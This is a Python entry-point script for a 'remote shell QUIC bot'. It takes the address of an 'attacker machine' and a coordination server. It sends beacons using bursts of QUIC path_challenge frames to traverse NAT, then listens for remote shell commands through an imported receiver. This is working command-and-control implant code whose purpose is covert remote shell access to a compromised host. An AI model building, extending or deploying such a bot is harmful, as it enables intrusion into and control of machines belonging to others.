#!/usr/bin/env python3

import os
import sys
import json
import asyncio
import argparse


from lib.shell_receiver import ShellReceiver
from lib.beacon import transmit_beacon


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="remote shell QUIC bot")

    parser.add_argument("-name",
                        type=str,
                        help="the name given for the bot (mandatory)")

    parser.add_argument("-addr",
                        type=str,
                        help="the address of the attacker machine (mandatory)")

    parser.add_argument("-cord_addr",
                        type=str,
                        default='localhost',
                        help="the address of the coordination server")

    parser.add_argument("-cord_port",
                        type=int,
                        default=1338,
                        help="the dest port used for coordination connection")

    parser.add_argument("-localhost",
                        type=bool,
                        default=False,
                        help="need to be set to true when using localhost connection (tested on windows)")

    parser.add_argument("-burst",
                        type=int,
                        default=1,
                        help="number of path_challenges to send at once")

    parser.add_argument("-burst_timeout",
                        type=int,
                        default=5,
                        help="timeout between each path_challenge burst")

    parser.add_argument("-timeout",
                        type=int,
                        default=10,
                        help="timeout for our bot to listen to new shell commands")

    parser.add_argument("-forever",
                        type=bool,
                        default=False,
                        help="exit after one nat traversal trial")

    args = parser.parse_args()
    if args.name is None or args.addr is None:
        parser.print_help()
        raise argparse.ArgumentError(
            argument=None, message="name is None or addr is None")
    return args


class ConnectionInfo:

    indent = 2
    bot_database_path = "connection_data/database.json"

    def __init__(self, **kwargs):
        config = self.__get_json_config(**kwargs)
        self.name: str = kwargs["name"]

        self.id: str = config["id"]
        self.addr: str = config["addr"]
        self.local_port: int = config["local_port"]

    def __get_json_config(self, **kwargs):
        if not os.path.isfile(self.bot_database_path):
            print(f"{self.bot_database_path} not found!")
            sys.exit(0)

        with open(self.bot_database_path, mode="r") as json_file:
            config = json.load(json_file)[kwargs["name"]]
            return config


async def main_loop():
    try:
        args = parse_args()
    except argparse.ArgumentError as e:
        print(e.message)
        return

    con_info = ConnectionInfo(**vars(args))

    # change to ipv4 "0.0.0.0". ipv4 doesn't work on localhost
    receiver = ShellReceiver(
        "::" if args.localhost else "0.0.0.0", con_info.local_port, args.timeout)

    while True:
        await transmit_beacon((args.cord_addr, args.cord_port), con_info.local_port, con_info.id.encode(), args.burst, args.burst_timeout)
        print("finished beacon")
        await receiver.listen()
        print("finished receiver")

        # TODO: temporary fix for
        # OSError: [WinError 10048] Only one usage of each socket address (protocol/network address/port) is normally permitted
        if not args.forever:
            break


if __name__ == "__main__":
    asyncio.run(main_loop())
